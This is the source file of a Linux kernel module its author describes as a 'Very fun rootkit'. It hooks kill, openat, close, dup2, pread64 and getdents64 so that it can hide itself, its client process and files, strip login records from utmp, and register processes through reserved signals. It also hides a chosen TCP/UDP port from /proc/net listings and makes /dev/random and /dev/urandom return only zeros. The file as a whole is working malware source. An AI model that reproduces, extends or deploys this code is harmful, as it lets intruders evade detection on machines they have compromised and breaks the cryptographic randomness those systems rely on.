#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <net/sock.h>
#include <net/tcp.h>
#include "hooking/utils.h"
#include "hooking/init.h"
#include "hooking/syscall.h"
#include "hooking/func.h"
#include "hooking/ops.h"
#include "capabilities/track.h"
#include "capabilities/hide.h"
#include "client.h"
#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

// Unused signal numbers can, be used by the rootkit for its own purposes
enum rooti_signals {
    ROOTI_SIG_HIDE = 63,  // toogle hiding of this kernel module
    ROOTI_SIG_REG = 64    // request by a usermode process to be serviced by the rootkit
};

// Userspace process serviced by this rootkit
static struct rooti_client rooti_client_proc;

// List of /proc directory FDs opened by userspace processes
static LIST_HEAD(rooti_proc_tracked_fds);

// List of FDs of /var/run/utmp opened by userspace processes
static LIST_HEAD(rooti_utmp_tracked_fds);

struct list_head *rooti_tracked_fds_lists[] = {
    &rooti_proc_tracked_fds,
    &rooti_utmp_tracked_fds
};

// References to the original syscall handlers which we are hooking
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
static asmlinkage long (*orig_close)(const struct pt_regs *regs);
static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

// References to the original file operations which we are hooking
static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);

// References to the original seq operations which we are hooking
static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;
    if (sig == ROOTI_SIG_HIDE) {
        // Toggle hidden state
        if (rooti_hidden) {
            rooti_showme();
        } else {
            rooti_hideme();
        }
        return 0;
    }
    else if (sig == ROOTI_SIG_REG) {
        // Register the new process
        return rooti_register_client(&rooti_client_proc);
    }
    return orig_kill(regs);
}


static asmlinkage long hook_openat(const struct pt_regs *regs)
{
    // Allocate a kernel buffer to store the requested filename
    char *filepath_user = (char *)regs->si;
    char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
    if (filepath_kernel == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return orig_openat(regs);
    }

    // Copy the requested filename to the kernel mode buffer
    int err = copy_from_user(filepath_kernel, filepath_user, NAME_MAX);
    if (err > 0) {
        printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
        kfree(filepath_kernel);
        return orig_openat(regs);
    }

    // Invoke the original syscall
    int fd = orig_openat(regs);
    
    // Check if the requested file to open is the /proc VFS directory
    if (strncmp(filepath_kernel, "/proc", NAME_MAX) == 0) {
        err = rooti_track_fd(fd, &rooti_proc_tracked_fds);
    }
    // Check if the requested file to open is the utmp file storing login records
    else if (strncmp(filepath_kernel, "/var/run/utmp", NAME_MAX) == 0) {
        err = rooti_track_fd(fd, &rooti_utmp_tracked_fds);
    }

    kfree(filepath_kernel);
    return fd;
}

static asmlinkage long hook_close(const struct pt_regs *regs)
{
    pid_t pid = current->pid;
    int fd = regs->di;
    struct rooti_tracked_fd *record;
    struct rooti_tracked_fd *tmp;

    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        // If present, remove the recorded FD
        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
            if (pid == record->pid && fd == record->fd) {
                rooti_untrack_fd(record);
            }
        }
    }
    return orig_close(regs);
}

static asmlinkage long hook_dup2(const struct pt_regs *regs)
{
    pid_t pid = current->pid;
    int oldfd = regs->di;
    int newfd = orig_dup2(regs);

    struct rooti_tracked_fd *record;
    struct rooti_tracked_fd *tmp;

    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        // If present, duplicate the recorded FD
        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
            if (pid == record->pid && oldfd == record->fd) {
                rooti_track_fd(newfd, rooti_tracked_fds_lists[i]);
            }
        }
    }
    return newfd;
}

static asmlinkage long hook_pread64(const struct pt_regs *regs) {
    pid_t pid = current->pid;
    int fd = regs->di;
    size_t count = regs->dx;
    char *user_buf = (char *)regs->si;

    // Invoke the original syscall
    size_t nread = orig_pread64(regs);

    struct rooti_tracked_fd *record;
    list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
        if (pid == record->pid && fd == record->fd) {
            rooti_hide_login_entry(user_buf, count, ROOTI_HIDE_USER);
        }
    }
    return nread;
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    // Invoke the original syscall
    int fd  = regs->di;
    struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
    int nread = orig_getdents64(regs);
    if (nread < 0) {
        return nread;
    }

    // Check if the directory FD is of /proc
    bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);

    // Filter any files we wish to hide from the buffer
    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, rooti_client_proc.pid);
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    // Check that this is not the header line and that the record is the one we want to hide
    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
        return 0;
    }
    // Not the port to hide - call the original handler
    return orig_tcp4_seq_show(seq, v);
}

static int hook_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    // Check that this is not the header line and that the record is the one we want to hide
    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
        return 0;
    }

    // Not the port to hide - call the original handler
    return orig_udp4_seq_show(seq, v);
}

static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
{
    // Get the size of the user buffer and allocate a matching kernel buffer filled with zeros
    size_t len = iov_iter_count(iter);
    char *kernel_buf = kzalloc(len, GFP_KERNEL);
    if (kernel_buf == NULL) {
        printk(KERN_DEBUG "rooti: failed to allocate memory\n");
        return -ENOMEM;
    }

    // Copy the rigged buffer back into userspace
    int err = copy_to_iter(kernel_buf, len, iter);
    if (!err) {
        printk(KERN_DEBUG "rooti: copy_to_iter() failed\n");
        kfree(kernel_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    return len;
}

// List of system calls to hook :D
struct rooti_func_hook func_hooks[] = {
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_close"), hook_close, &orig_close),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_dup2"), hook_dup2, &orig_dup2),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
};

struct rooti_file_ops_hook file_ops_hooks[] = {
    ROOTI_OPS_HOOK("random_fops", ROOTI_FILE_READ_ITER, hook_random_read_iter, &orig_random_read_iter),
    ROOTI_OPS_HOOK("urandom_fops", ROOTI_FILE_READ_ITER, hook_random_read_iter, &orig_random_read_iter),
};

struct rooti_seq_ops_hook seq_ops_hooks[] = {
    ROOTI_OPS_HOOK("tcp4_seq_ops", ROOTI_SEQ_SHOW, hook_tcp4_seq_show, &orig_tcp4_seq_show),
    ROOTI_OPS_HOOK("udp_seq_ops", ROOTI_SEQ_SHOW, hook_udp4_seq_show, &orig_udp4_seq_show)
};

/* LKM initialization */
static int __init rooti_init(void)
{
    printk(KERN_INFO "rooti: init\n");
    
    int ret = rooti_hooking_init();
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_hooking_init() failed: %d\n", ret);
        return ret;
    }

    // Install hooks :D
    ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
        return ret;
    }

    ret = rooti_install_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_install_file_ops_hooks() failed: %d\n", ret);
        return ret;
    }

    ret = rooti_install_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_install_seq_ops_hooks() failed: %d\n", ret);
        return ret;
    }

    // TODO: at some point rooti_hideme() should be called on init

    return 0;
}

/* LKM cleanup */
static void __exit rooti_exit(void)
{
    printk(KERN_INFO "rooti: exit\n");
    rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
    rooti_uninstall_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
    rooti_uninstall_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));

    struct rooti_tracked_fd *record;
    struct rooti_tracked_fd *tmp;

    // Release any remaining records
    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
            rooti_untrack_fd(record);
        }
    }
}

module_init(rooti_init);
module_exit(rooti_exit);
